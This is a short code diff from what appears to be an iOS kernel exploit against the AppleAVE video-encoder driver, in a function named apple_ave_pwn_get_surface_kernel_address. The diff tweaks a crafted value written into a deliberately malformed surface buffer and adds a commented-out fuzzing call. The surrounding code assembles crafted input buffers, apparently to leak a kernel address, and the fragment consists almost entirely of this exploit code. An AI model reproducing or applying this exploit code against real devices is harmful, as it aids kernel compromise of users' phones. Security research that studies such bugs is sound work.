@@ -114,6 +114,9 @@ kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void
     bzero(input_buffer, sizeof(input_buffer));
     bzero(output_buffer, sizeof(output_buffer));
 
+    // Don't try
+//    fuzz_encode_frames(g_apple_ave_conn, g_bad_surface_that_will_never_be_freed, surface_id);
+    
 	//*(unsigned int*)input_buffer = 0xDEADBEEF;
 	*(unsigned int*)(input_buffer + 0x4) = g_bad_surface_that_will_never_be_freed;
 	*(unsigned int*)(input_buffer + 0x8) = g_bad_surface_that_will_never_be_freed;
@@ -130,7 +133,7 @@ kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void
     input_buffer[0xFC] = 1;
     input_buffer[0x2F4] = 1;
 
-	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_info_type)) = 0xffff;
+	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_info_type)) = 0x4567;
 
 	*((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_chroma_format_idc)) = 1;
 	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_width)) = 0xC0;
